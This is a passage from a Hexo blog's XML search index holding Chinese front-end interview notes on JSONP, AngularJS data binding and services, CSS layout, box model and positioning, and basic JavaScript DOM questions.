    <content type="text"><![CDATA[1、手写jsonp的实现 123456function createJs(sUrl) { var s = document.createElement('script'); s.type = 'text/javascript'; s.src = sUrl; document.getElementByTagName('head')[0].appendChild(s);} 2、手写链表倒数第K个查找1234567891011121314151617181920212223242526272829/*public class ListNode { int val; ListNode next = null; ListNode(int val) { this.val = val; }}*/public class Solution { public ListNode FindKthToTail(ListNode head,int k) { if(head==null||k]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>笔试面试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HelloWorld]]></title>
    <url>%2F2018%2F05%2F06%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>hello</category>
      </categories>
      <tags>
        <tag>Hello</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AngularJs简述]]></title>
    <url>%2F2018%2F05%2F06%2FAngularJs%2F</url>
    <content type="text"><![CDATA[Angular 的数据绑定采用什么机制？详述原理脏检查机制。 双向数据绑定是 AngularJS 的核心机制之一。当 view 中有任何数据变化时，会更新到 model ，当 model 中数据有变化时，view 也会同步更新，显然，这需要一个监控。 原理就是，Angular 在 scope 模型上设置了一个 监听队列，用来监听数据变化并更新 view 。每次绑定一个东西到 view 上时 AngularJS 就会往 $watch 队列里插入一条 $watch，用来检测它监视的 model 里是否有变化的东西。当浏览器接收到可以被 angular context 处理的事件时，$digest 循环就会触发，遍历所有的 $watch，最后更新 dom。 举个栗子 1increase 1 click 时会产生一次更新的操作（至少触发两次 $digest 循环） 按下按钮浏览器接收到一个事件，进入到 angular context$digest 循环开始执行，查询每个 $watch 是否变化由于监视 $scope.val 的 $watch 报告了变化，因此强制再执行一次 $digest 循环新的 $digest 循环未检测到变化浏览器拿回控制器，更新 $scope.val 新值对应的 dom$digest 循环的上限是 10 次（超过 10次后抛出一个异常，防止无限循环）。 factory、service 和 provider 是什么关系？factory 把 service 的方法和数据放在一个对象里，并返回这个对象 12345678app.factory('FooService', function(){ return { target: 'factory', sayHello: function(){ return 'hello ' + this.target; } }}); service 通过构造函数方式创建 service，返回一个实例化对象 1234567app.service('FooService', function(){ var self = this; this.target = 'service'; this.sayHello = function(){ return 'hello ' + self.target; }}); provider 创建一个可通过 config 配置的 service，$get 中返回的，就是用 factory 创建 service 的内容 12345678910111213141516171819202122app.provider('FooService', function(){ this.configData = 'init data'; this.setConfigData = function(data){ if(data){ this.configData = data; } } this.$get = function(){ var self = this; return { target: 'provider', sayHello: function(){ return self.configData + ' hello ' + this.target; } } }});// 此处注入的是 FooService 的 providerapp.config(function(FooServiceProvider){ FooServiceProvider.setConfigData('config data');}); 从底层实现上来看，service 调用了 factory，返回其实例；factory 调用了 provider，返回其 $get 中定义的内容。factory 和 service 功能类似，只不过 factory 是普通 function，可以返回任何东西（return 的都可以被访问，所以那些私有变量怎么写，你懂的）；service 是构造器，可以不返回（绑定到 this 的都可以被访问）；provider 是加强版 factory，返回一个可配置的 factory。]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>AngularJs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS面试]]></title>
    <url>%2F2018%2F05%2F06%2FCSS%E9%9D%A2%E8%AF%95%E9%A2%98%2F</url>
    <content type="text"><![CDATA[解释一下CSS的盒子模型？盒子模型也有人称为框模型，HTML中的多数元素都会在浏览器中生成一个矩形的区域，每个区域包含四个组成部分，从外向内依次是：外边距（Margin）、边框（Border）、内边距（Padding）和内容（Content），其实盒子模型有两种，分别是 ie 盒子模型和标准 w3c 盒子模型，加上了doctype声明，让所有浏览器都会采用标准 w3c 盒子模型去解释你的盒子。 请你说说CSS选择器的类型有哪些，并举几个例子说明其用法？类型：基础的选择器、组合选择器、属性选择器、伪类、伪元素 基础的选择器 组合选择器 属性选择器 伪类 伪元素 请你说说CSS有什么特殊性?（优先级、计算特殊值优先级 同类型，同级别的样式后者先于前者 ID > 类样式 > 标签 > * 内联>ID选择器>伪类>属性选择器>类选择器>标签选择器>通用选择器(*)>继承的样式 具体 > 泛化的，特殊性即css优先级 近的 > 远的 (内嵌样式 > 内部样式表 > 外联样式表) 内嵌样式：内嵌在元素中，span 内部样式表：在页面中的样式，写在中的样式 外联样式表：单独存在一个css文件中，通过link引入或import导入的样式 !important 权重最高，比 inline style 还要高 计算特殊性值 important > 内嵌 > ID > 类 > 标签 | 伪类 | 属性选择 > 伪对象 > 继承 > 通配符权重、特殊性计算法： CSS样式选择器分为4个等级，a、b、c、d 如果样式是行内样式（通过Style=“”定义），那么a=1，1,0,0,0 b为ID选择器的总数 0,1,0,0 为属性选择器，伪类选择器和class类选择器的数量。0,0,1,0 d为标签、伪元素选择器的数量 0,0,0,1 !important 权重最高，比 inline style 还要高 比如结果为：1093比1100，按位比较，从左到右，只要一位高于则立即胜出，否则继续比较。 要动态改变层中内容可以使用的方法？innerHTML，innerText 常见浏览器兼容性问题与解决方案？(1)浏览器兼容问题一：不同浏览器的标签默认的外补丁和内补丁不同 问题症状：随便写几个标签，不加样式控制的情况下，各自的margin 和padding差异较大。 碰到频率:100% 解决方案：CSS里 *{margin:0;padding:0;} 备注：这个是最常见的也是最易解决的一个浏览器兼容性问题，几乎所有的CSS文件开头都会用通配符*来设置各个标签的内外补丁是0。 (2)浏览器兼容问题二：块属性标签float后，又有横行的margin情况下，在IE6显示margin比设置的大 问题症状:常见症状是IE6中后面的一块被顶到下一行 碰到频率：90%（稍微复杂点的页面都会碰到，float布局最常见的浏览器兼容问题） 解决方案：在float的标签样式控制中加入 display:inline;将其转化为行内属性 备注：我们最常用的就是div+CSS布局了，而div就是一个典型的块属性标签，横向布局的时候我们通常都是用div float实现的，横向的间距设置如果用margin实现，这就是一个必然会碰到的兼容性问题。 (3)浏览器兼容问题三：设置较小高度标签（一般小于10px），在IE6，IE7，遨游中高度超出自己设置高度 问题症状：IE6、7和遨游里这个标签的高度不受控制，超出自己设置的高度 碰到频率：60% 解决方案：给超出高度的标签设置overflow:hidden;或者设置行高line-height 小于你设置的高度。 备注：这种情况一般出现在我们设置小圆角背景的标签里。出现这个问题的原因是IE8之前的浏览器都会给标签一个最小默认的行高的高度。即使你的标签是空的，这个标签的高度还是会达到默认的行高。 (4)浏览器兼容问题四：行内属性标签，设置display:block后采用float布局，又有横行的margin的情况，IE6间距bug 问题症状：IE6里的间距比超过设置的间距 碰到几率：20% 解决方案 ： 在display:block;后面加入display:inline;display:table; 备注：行内属性标签，为了设置宽高，我们需要设置display:block;(除了input标签比较特殊)。在用float布局并有横向的margin后，在IE6下，他就具有了块属性float后的横向margin的bug。不过因为它本身就是行内属性标签，所以我们再加上display:inline的话，它的高宽就不可设了。这时候我们还需要在display:inline后面加入display:talbe。 (5) 浏览器兼容问题五：图片默认有间距 问题症状：几个img标签放在一起的时候，有些浏览器会有默认的间距，加了问题一中提到的通配符也不起作用。 碰到几率：20% 解决方案：使用float属性为img布局 备注 ： 因为img标签是行内属性标签，所以只要不超出容器宽度，img标签都会排在一行里，但是部分浏览器的img标签之间会有个间距。去掉这个间距使用float是正道。（我的一个学生使用负margin，虽然能解决，但负margin本身就是容易引起浏览器兼容问题的用法，所以我禁止他们使用） (6) 浏览器兼容问题六：标签最低高度设置min-height不兼容 问题症状：因为min-height本身就是一个不兼容的CSS属性，所以设置min-height时不能很好的被各个浏览器兼容 碰到几率：5% 解决方案：如果我们要设置一个标签的最小高度200px，需要进行的设置为：{min-height:200px; height:auto !important; height:200px; overflow:visible;} 备注：在B/S系统前端开时，有很多情况下我们又这种需求。当内容小于一个值（如300px）时。容器的高度为300px；当内容高度大于这个值时，容器高度被撑高，而不是出现滚动条。这时候我们就会面临这个兼容性问题。 (7)浏览器兼容问题七：透明度的兼容CSS设置 一般在ie中用的是filter:alpha(opacity=0);这个属性来设置div或者是块级元素的透明度，而在firefox中，一般就是直接使用opacity:0,对于兼容的，一般的做法就是在书写css样式的将2个都写上就行，就能实现兼容 列出display的值并说明他们的作用？display： none | inline | block | list-item | inline-block | table | inline-table | table-caption | table-cell | table-row | table-row-group | table-column | table-column-group | table-footer-group | table-header-group | run-in | box | inline-box | flexbox | inline-flexbox | flex | inline-flex 默认值：inline none： 隐藏对象。与visibility属性的hidden值不同，其不为被隐藏的对象保留其物理空间 inline： 指定对象为内联元素。 block： 指定对象为块元素。 list-item： 指定对象为列表项目。 inline-block： 指定对象为内联块元素。（CSS2） table： 指定对象作为块元素级的表格。类同于html标签（CSS2） inline-table： 指定对象作为内联元素级的表格。类同于html标签（CSS2） table-caption： 指定对象作为表格标题。类同于html标签（CSS2） table-cell： 指定对象作为表格单元格。类同于html标签（CSS2） table-row： 指定对象作为表格行。类同于html标签（CSS2） table-row-group： 指定对象作为表格行组。类同于html标签（CSS2） table-column： 指定对象作为表格列。类同于html标签（CSS2） table-column-group： 指定对象作为表格列组显示。类同于html标签（CSS2） table-header-group： 指定对象作为表格标题组。类同于html标签（CSS2） table-footer-group： 指定对象作为表格脚注组。类同于html标签（CSS2） run-in： 根据上下文决定对象是内联对象还是块级对象。（CSS3） box： 将对象作为弹性伸缩盒显示。（伸缩盒最老版本）（CSS3） inline-box： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒最老版本）（CSS3） flexbox： 将对象作为弹性伸缩盒显示。（伸缩盒过渡版本）（CSS3） inline-flexbox： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒过渡版本）（CSS3） flex： 将对象作为弹性伸缩盒显示。（伸缩盒最新版本）（CSS3） inline-flex： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒最新版本）（C 如何居中div, 如何居中一个浮动元素? 非浮动元素居中：可以设置 margin:0 auto 令其居中, 定位 ,父级元素text-algin:center等等 浮动元素居中: 方法一:设置当前div的宽度，然后设置margin-left:50%; position:relative; left:-250px;其中的left是宽度的一半。 方法二:父元素和子元素同时左浮动，然后父元素相对左移动50%，再然后子元素相对左移动-50%。 方法三:position定位等等。 CSS中 link 和@import 的区别是？ link属于HTML标签，而@import是CSS提供的; 页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载; @import只在IE5以上才能识别，而link是HTML标签，无兼容问题; link方式的样式的权重 高于@import的权重. 请列举几种清除浮动的方法(至少两种)? 父级div定义 height 原理：父级div手动定义height，就解决了父级div无法自动获取到高度的问题。 优点：简单、代码少、容易掌握 缺点：只适合高度固定的布局，要给出精确的高度，如果高度和父级div不一样时，会产生问题 建议：不推荐使用，只建议高度固定的布局时使用 结尾处加空div标签 clear:both 原理：添加一个空div，利用css提高的clear:both清除浮动，让父级div能自动获取到高度 优点：简单、代码少、浏览器支持好、不容易出现怪问题 缺点：不少初学者不理解原理；如果页面浮动布局多，就要增加很多空div，让人感觉很不好 建议：不推荐使用，但此方法是以前主要使用的一种清除浮动方法 父级div定义 伪类:after 和 zoom 原理：IE8以上和非IE浏览器才支持:after，原理和方法2有点类似，zoom(IE转有属性)可解决ie6,ie7浮动问题 优点：浏览器支持好、不容易出现怪问题（目前：大型网站都有使用，如：腾迅，网易，新浪等等） 缺点：代码多、不少初学者不理解原理，要两句代码结合使用才能让主流浏览器都支持。 建议：推荐使用，建议定义公共类，以减少CSS代码。 父级div定义 overflow:hidden 原理：必须定义width或zoom:1，同时不能定义height，使用overflow:hidden时，浏览器会自动检查浮动区域的高度 优点：简单、代码少、浏览器支持好 缺点：不能和position配合使用，因为超出的尺寸的会被隐藏。 建议：只推荐没有使用position或对overflow:hidden理解比较深的朋友使用。 父级div定义 overflow:auto 原理：必须定义width或zoom:1，同时不能定义height，使用overflow:auto时，浏览器会自动检查浮动区域的高度 优点：简单、代码少、浏览器支持好 缺点：内部宽高超过父级div时，会出现滚动条。 建议：不推荐使用，如果你需要出现滚动条或者确保你的代码不会出现滚动条就使用吧。 block，inline和inlinke-block细节对比？ display:block block元素会独占一行，多个block元素会各自新起一行。默认情况下，block元素宽度自动填满其父元素宽度。 block元素可以设置width,height属性。块级元素即使设置了宽度,仍然是独占一行。 block元素可以设置margin和padding属性。 display:inline inline元素不会独占一行，多个相邻的行内元素会排列在同一行里，直到一行排列不下，才会新换一行，其宽度随元素的内容而变化。 inline元素设置width,height属性无效。 inline元素的margin和padding属性，水平方向的padding-left, padding-right, margin-left, margin-right都产生边距效果；但竖直方向的padding-top, padding-bottom, margin-top, margin-bottom不会产生边距效果。 display:inline-block 简单来说就是将对象呈现为inline对象，但是对象的内容作为block对象呈现。之后的内联对象会被排列在同一行内。比如我们可以给一个link（a元素）inline-block属性值，使其既具有block的宽度高度特性又具有inline的同行特性。 补充说明 一般我们会用display:block，display:inline或者display:inline-block来调整元素的布局级别，其实display的参数远远不止这三种，仅仅是比较常用而已。 IE（低版本IE）本来是不支持inline-block的，所以在IE中对内联元素使用display:inline-block，理论上IE是不识别的，但使用display:inline-block在IE下会触发layout，从而使内联元素拥有了display:inline-block属性的表象。 什么叫优雅降级和渐进增强？ 优雅降级： Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会检查以确认它们是否能正常工作。由于IE独特的盒模型布局问题，针对不同版本的IE的hack实践过优雅降级了,为那些无法支持功能的浏览器增加候选方案，使之在旧式浏览器上以某种形式降级体验却不至于完全失效. 渐进增强： 从被所有浏览器支持的基本功能开始，逐步地添加那些只有新式浏览器才支持的功能,向页面增加无害于基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。 说说浮动元素会引起的问题和你的解决办法 问题： （1）父元素的高度无法被撑开，影响与父元素同级的元素 （2）与浮动元素同级的非浮动元素会跟随其后 （3）若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构 解决方法： 使用CSS中的clear:both;属性来清除元素的浮动可解决问题(2)、(3)，对于问题(1)，添加如下样式，给父元素添加clearfix样式：12.clearfix:after{content: ".";display: block;height: 0;clear: both;visibility: hidden;}.clearfix{display: inline-block;} /* for IE/Mac */ 你有哪些性能优化的方法？ 减少http请求次数：CSS Sprites, JS、CSS源码压缩、图片大小控制合适；网页Gzip，CDN托管，data缓存 ，图片服务器。 前端模板 JS+数据，减少由于HTML标签导致的带宽浪费，前端用变量保存AJAX请求结果，每次操作本地变量，不用请求，减少请求次数 用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能。 当需要设置的样式很多时设置className而不是直接操作style。 少用全局变量、缓存DOM节点查找的结果。减少IO读取操作。 避免使用CSS Expression（css表达式)又称Dynamic properties(动态属性)。 图片预加载，将样式表放在顶部，将脚本放在底部加上时间戳。 为什么要初始化CSS样式？因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，但力求影响最小的情况下初始化。 解释下浮动和它的工作原理？清除浮动的技巧？浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。 使用空标签清除浮动。 这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。 使用overflow。 给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。 使用after伪对象清除浮动。 该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素； CSS样式表根据所在网页的位置，可分为哪几种样式表？行内样式表，内嵌样式表，外部样式表 谈谈你对CSS中刻度的认识？ 在CSS中刻度是用于设置元素尺寸的单位。 a、特殊值0可以省略单位。例如：margin:0px可以写成margin:0 b、一些属性可能允许有负长度值，或者有一定的范围限制。如果不支持负长度值，那应该变换到能够被支持的最近的一个长度值。 c、长度单位包括：相对单位和绝对单位。 相对长度单位有： em, ex, ch, rem, vw, vh, vmax, vmin 绝对长度单位有： cm, mm, q, in, pt, pc, px 绝对长度单位：1in = 2.54cm = 25.4 mm = 72pt = 6pc = 96px 文本相对长度单位：em 相对长度单位是相对于当前对象内文本的字体尺寸，如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。(相对父元素的字体大小倍数) 12345body { font-size: 14px; }h1 { font-size: 16px; }.size1 p { font-size: 1em; }.size2 p { font-size: 2em; }.size3 p { font-size: 3em; } 文本相对长度单位：rem rem是CSS3新增的一个相对单位（root em，根em），相对于根元素(即html元素)font-size计算值的倍数 只相对于根元素的大小 浏览器的默认字体大小为16像素，浏览器默认样式也称为user agent stylesheet，就是所有浏览器内置的默认样式，多数是可以被修改的，但chrome不能直接修改，可以被用户样式覆盖。 请你说说em与rem的区别？ rem rem是CSS3新增的一个相对单位（root em，根em），相对于根元素(即html元素)font-size计算值的倍数 只相对于根元素的大小 rem（font size of the root element）是指相对于根元素的字体大小的单位。简单的说它就是一个相对单位。 作用：利用rem可以实现简单的响应式布局，可以利用html元素中字体的大小与屏幕间的比值设置font-size的值实现当屏幕分辨率变化时让元素也变化，以前的天猫tmall就使用这种办法 em 文本相对长度单位。相对于当前对象内文本的字体尺寸。如当前对行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸(默认16px)。(相对父元素的字体大小倍数) em（font size of the element）是指相对于父元素的字体大小的单位。它与rem之间其实很相似，区别在。（相对是的HTML元素的字体大，默认16px） em与rem的重要区别： 它们计算的规则一个是依赖父元素另一个是依赖根元素计算 请你说说box-sizing属性的的用法？设置或检索对象的盒模型组成模式 a、box-sizing:content-box： padding和border不被包含在定义的width和height之内。对象的实际宽度等于设置的width值和border、padding之和，即 ( Element width = width + border + padding，但占有页面位置还要加上margin ) 此属性表现为标准模式下的盒模型。 b、box-sizing:border-box： padding和border被包含在定义的width和height之内。对象的实际宽度就等于设置的width值，即使定义有border和padding也不会改变对象的实际宽度，即 ( Element width = width ) 此属性表现为怪异模式下的盒模型。 浏览器标准模式和怪异模式之间的区别是什么？在“标准模式”(Standards Mode) 页面按照 HTML 与 CSS 的定义渲染，而在“怪异模式”(Quirks Mode)就是浏览器为了兼容很早之前针对旧版本浏览器设计、并未严格遵循 W3C 标准的网页而产生的一种页面渲染模式。浏览器基于页面中文件类型描述的存在以决定采用哪种渲染模式；如果存在一个完整的DOCTYPE则浏览器将会采用标准模式，而如果它缺失则浏览器将会采用怪异模式。 强烈建议阅读加深理解：[怪异模式（Quirks Mode）对 HTML 页面的影响]link(http://www.ibm.com/developerworks/cn/web/1310_shatao_quirks/)，这里列下浏览器标准模式和怪异模式的区别： 盒模型： 在怪异模式下，盒模型为IE盒模型而非标准模式下的W3C 盒模型：在 IE 盒模型中，box width = content width + padding left + padding right + border left + border right，- box height = content height + padding top + padding bottom + border top + border bottom。而在 W3C 标准的盒模型中，box 的大小就是 content 的大小。 图片元素的垂直对齐方式: 对于inline元素和table-cell元素，在 IE Standards Mode 下 vertical-align 属性默认取值为baseline。而当inline元素的内容只有图片时，如table的单元格table-cell。在 IE Quirks Mode 下，table单元格中的图片的 vertical-align 属性默认为bottom，因此，在图片底部会有几像素的空间。 元素中的字体: CSS 中，描述font的属性有font-family，font-size，font-style，font-weigh,上述属性都是可以继承的。而在 IE Quirks Mode 下，对于table 元素，字体的某些属性将不会从body或其他封闭元素继承到table中，特别是 font-size属性。 内联元素的尺寸: 在 IE Standards Mode 下，non-replaced inline 元素无法自定义大小，而在 IE Quirks Mode 下，定义这些元素的width和height 属性，能够影响该元素显示的大小尺寸。 元素的百分比高度: a、CSS 中对于元素的百分比高度规定如下，百分比为元素包含块的高度，不可为负值。如果包含块的高度没有显式给出，该值等同于“auto”（即取决于内容的高度）。所以百分比的高度必须在父元素有声明高度时使用。 b、当一个元素使用百分比高度时，在 IE Standards Mode 下，高度取决于内容的变化，而在 Quirks Mode 下，百分比高度则被正确应用。 元素溢出的处理： 在 IE Standard Mode 下，overflow取默认值 visible，即溢出可见，这种情况下，溢出内容不会被裁剪，呈现在元素框外。而在 Quirks Mode 下，该溢出被当做扩展box来对待，即元素的大小由其内容决定，溢出不会被裁剪，元素框自动调整，包含溢出内容 说说你对边距折叠的理解? 外边距折叠： 相邻的两个或多个外边距 (margin) 在垂直方向会合并成一个外边距（margin） 相邻： 没有被非空内容、padding、border 或 clear 分隔开的margin特性. 非空内容就是说这元素之间要么是兄弟关系或者父子关系 垂直方向外边距合并计算: 参加折叠的margin都是正值：取其中 margin 较大的值为最终 margin 值。 参与折叠的 margin 都是负值：取的是其中绝对值较大的，然后，从 0 位置，负向位移。 参与折叠的 margin 中有正值，有负值：先取出负 margin 中绝对值中最大的，然后，和正 margin 值中最大的 margin 相加。 说说隐藏元素的方式有哪些？ 使用CSS的display:none，不会占有原来的位置 使用CSS的display:hidden，会占有原来的位置 使用CSS的visibility:hidden，会占有原来的位置 使用HTML5中的新增属性hidden=”hidden”，不会占有原来的位置 为什么重置浏览器默认样式，如何重置默浏览器认样式？每种浏览器都有一套默认的样式表，即user agent stylesheet，网页在没有指定的样式时，按浏览器内置的样式表来渲染。这是合理的，像word中也有一些预留样式，可以让我们的排版更美观整齐。不同浏览器甚至同一浏览器不同版本的默认样式是不同的。但这样会有很多兼容问题。 最简单的办法：（不推荐使用）*{margin: 0;padding: 0;}。 使用CSSReset可以将所有浏览器默认样式设置成一样。 normalize：也许有些cssreset过于简单粗暴，有点伤及无辜，normalize是另一个选择。bootstrap已经引用该css来重置浏览器默认样式，比普通的cssreset要精细一些，保留浏览器有用的默认样式，支持包括手机浏览器在内的超多浏览器，同时对HTML5元素、排版、列表、嵌入的内容、表单和表格都进行了一般化。 谈谈你对BFC与IFC的理解？(是什么，如何产生，作用) 什么是BFC与IFC BFC（Block Formatting Context）即“块级格式化上下文”， IFC（Inline Formatting Context）即行内格式化上下文。常规流（也称标准流、普通流）是一个文档在被显示时最常见的布局形态。一个框在常规流中必须属于一个格式化上下文，你可以把BFC想象成一个大箱子，箱子外边的元素将不与箱子内的元素产生作用。 BFC是W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行定位，以及与其他元素的关系和相互作用。当涉及到可视化布局的时候，Block Formatting Context提供了一个环境，HTML元素在这个环境中按照一定规则进行布局。一个环境中的元素不会影响到其它环境中的布局。比如浮动元素会形成BFC，浮动元素内部子元素的主要受该浮动元素影响，两个浮动元素之间是互不影响的。也可以说BFC就是一个作用范围。 在普通流中的 Box(框) 属于一种 formatting context(格式化上下文) ，类型可以是 block ，或者是 inline ，但不能同时属于这两者。并且， Block boxes(块框) 在 block formatting context(块格式化上下文) 里格式化， Inline boxes(块内框) 则在 Inline Formatting Context(行内格式化上下文) 里格式化。 如何产生BFC 当一个HTML元素满足下面条件的任何一点，都可以产生Block Formatting Context： float的值不为none overflow的值不为visible display的值为table-cell, table-caption, inline-block中的任何一个 position的值不为relative和static CSS3触发BFC方式则可以简单描述为：在元素定位非static，relative的情况下触发，float也是一种定位方式。 (3)、BFC的作用与特点 不和浮动元素重叠，清除外部浮动，阻止浮动元素覆盖 如果一个浮动元素后面跟着一个非浮动的元素，那么就会产生一个重叠的现象。常规流（也称标准流、普通流）是一个文档在被显示时最常见的布局形态，当float不为none时，position为absolute、fixed时元素将脱离标准流。 说说你对页面中使用定位(position)的理解？使用css布局position非常重要，语法如下：position：static | relative | absolute | fixed | center | page | sticky默认值：static，center、page、sticky是CSS3中新增加的值。 static 可以认为静态的，默认元素都是静态的定位，对象遵循常规流。此时4个定位偏移属性不会被应用，也就是使用left，right，bottom，top将不会生效。 relative 相对定位，对象遵循常规流，并且参照自身在常规流中的位置通过top，right，bottom，left这4个定位偏移属性进行偏移时不会影响常规流中的任何元素。 absolute 绝对定位，对象脱离常规流，此时偏移属性参照的是离自身最近的定位祖先元素，如果没有定位的祖先元素，则一直回溯到body元素。盒子的偏移位置不影响常规流中的任何元素，其margin不与其他任何margin折叠。 元素定位参考的是离自身最近的定位祖先元素，要满足两个条件，第一个是自己的祖先元素，可以是父元素也可以是父元素的父元素，一直找，如果没有则选择body为对照对象。第二个条件是要求祖先元素必须定位，通俗说就是position的属性值为非static都行。 fixed 固定定位，与absolute一致，但偏移定位是以窗口为参考。当出现滚动条时，对象不会随着滚动。 center 与absolute一致，但偏移定位是以定位祖先元素的中心点为参考。盒子在其包含容器垂直水平居中。（CSS3） 、page 与absolute一致。元素在分页媒体或者区域块内，元素的包含块始终是初始包含块，否则取决于每个absolute模式。（CSS3） sticky 对象在常态时遵循常规流。它就像是relative和fixed的合体，当在屏幕中时按常规流排版，当卷动到屏幕外时则表现如fixed。该属性的表现是现实中你见到的吸附效果。（CSS3） 如何解决多个元素重叠问题？ 使用z-index属性可以设置元素的层叠顺序 z-index属性 语法：z-index: auto | 默认值：auto 适用于：定位元素。即定义了position为非static的元素 取值： auto： 元素在当前层叠上下文中的层叠级别是0。元素不会创建新的局部层叠上下文，除非它是根元素。 整数： 用整数值来定义堆叠级别。可以为负值。 说明： 检索或设置对象的层叠顺序。 z-index用于确定元素在当前层叠上下文中的层叠级别，并确定该元素是否创建新的局部层叠上下文。 当多个元素层叠在一起时，数字大者将显示在上面。 伪类和伪元素的区别CSS 伪类用于向某些选择器添加特殊的效果。 CSS 伪元素用于将特殊的效果添加到某些选择器。 可以明确两点，第一两者都与选择器相关，第二就是添加一些“特殊”的效果。这里特殊指的是两者描述了其他 css 无法描述的东西。 伪类种类 伪元素种类 CSS实现垂直居中123 果我们要实现 .children 在 .parent 中垂直居中。 通常第一印象会想起给父元素设置相对定位，给子元素设置绝对定位。这样子元素就相对于父元素定位，再通过 top 与 left 各偏移 50% 父元素宽度，使用 margin-* 来修正子元素的位置。 123456789101112.parent { position: relative;}.chilren { width: $width; height: $height; position: absolute; top: 50%; left: 50%; margin-top: -$height/2; margin-left: -$width/2;} 通过这种方式可以使得子元素在父元素中垂直居中。但是这种实现的方式需要知道子元素的宽高，以方便使用 margin-* 来修正之前的位置。 当不知道子元素的宽高时，这种方法就无法实现正真的垂直居中。这个时候就可以使用 transform: translate(-50%, -50%); 来实现子元素自身的偏移。 123456789.parent { position: relative;}.chilren { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);} 那么不使用定位是否能够使元素垂直居中呢？ 这时候我们来想想要使元素水平居中的时候，我们会怎么做？Ok，一般我们都会用 margin: 0 auto;那么我们就可以让 margin-top: 50%, 这样的效果就跟相对定位时的 top: 50% 的效果差不多。接着就可以使用之前使用过的 transform 属性来使得元素向上偏移自身高度的一半，也就是 transform: translateY(-50%);。 这样就可以实现不使用定位来来使得元素垂直居中了。 1234.chilren { margin: 50% auto 0; transform: translateY(-50%);} 除了上面的这些方法之外，还可以使用 Flexbox 布局来实现。 只需要在父元素中使用 display: flex;，然后在子元素上使用 margin: auto; 就可以实现垂直居中了。 123456.parent { display: flex;}.chilren { margin: auto;}]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS面试题]]></title>
    <url>%2F2018%2F05%2F06%2FJS%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[初级==0. JS继承的实现方式==原型链继承 核心： 将父类的实例作为子类的原型 构造继承 核心：使用父类的构造函数来增强子类实例，等于是复制父类的实例属性给子类 call & apply ==1. 列举js异步编程的方法==回调函数，这是异步编程最基本的方法。事件监听，另一种思路是采用事件驱动模式。任务的执行不取决于代码的顺序，而取决于某个事件是否发生。发布/订阅，上一节的”事件”，完全可以理解成”信号”。Promises对象，Promises 对象是CommonJS 工作组提出的一种规范，目的是为异步编程提供统一接口。 ==2. JavaScript的数据类型都有什么？==基本数据类型：String,Boolean,Number,Undefined, Null 引用数据类型：Object(Array,Date,RegExp,Function) 那么问题来了，如何判断某变量是否为数组数据类型？ 方法一.判断其是否具有“数组性质”，如slice()方法。可自己给该变量定义slice方法，故有时会失效 方法二.obj instanceof Array 在某些IE版本中不正确 方法三.方法一二皆有漏洞，在ECMA Script5中定义了新方法Array.isArray(), 保证其兼容性，最好的方法如下： 123456if(typeof Array.isArray==="undefined"){ Array.isArray = function(arg){ return Object.prototype.toString.call(arg)==="[object Array]" }; } ==3. 已知ID的Input输入框，希望获取这个输入框的输入值，怎么做？(不使用第三方框架)==1document.getElementById(“ID”).value ==4. 希望获取到页面中所有的checkbox怎么做？(不使用第三方框架)==12345678var domList = document.getElementsByTagName(‘input’)var checkBoxList = [];var len = domList.length; //缓存到局部变量while (len--) { //使用while的效率会比for循环更高 if (domList[len].type == ‘checkbox’) { checkBoxList.push(domList[len]); }} ==5. 设置一个已知ID的DIV的html内容为xxxx，字体颜色设置为黑色(不使用第三方框架)==123var dom = document.getElementById(“ID”);dom.innerHTML = “xxxx”;dom.style.color = “#000”; ==6. 当一个DOM节点被点击时候，我们希望能够执行一个函数，应该怎么做？== 直接在DOM里绑定事件： 在JS里通过onclick绑定：xxx.onclick = test 通过事件添加进行绑定：( ⊙ o ⊙ )啊！5addEventListener(xxx, ‘click’, test) IE为事件冒泡用attachEvent()那么问题来了，Javascript的事件流模型都有什么？ “事件冒泡”：事件开始由最具体的元素接受，然后逐级向上传播 “事件捕捉”：事件由最不具体的节点先接收，然后逐级向下，一直到最具体的 “DOM事件流”：三个阶段：事件捕捉，目标阶段，事件冒泡 ==7. 什么是Ajax和JSON，它们的优缺点。==Ajax是异步JavaScript和XML，用于在Web页面中实现异步数据交互。 优点： 可以使得页面不重载全部内容的情况下加载局部内容，降低数据传输量 避免用户不断刷新或者跳转页面，提高用户体验 缺点： 对搜索引擎不友好（ 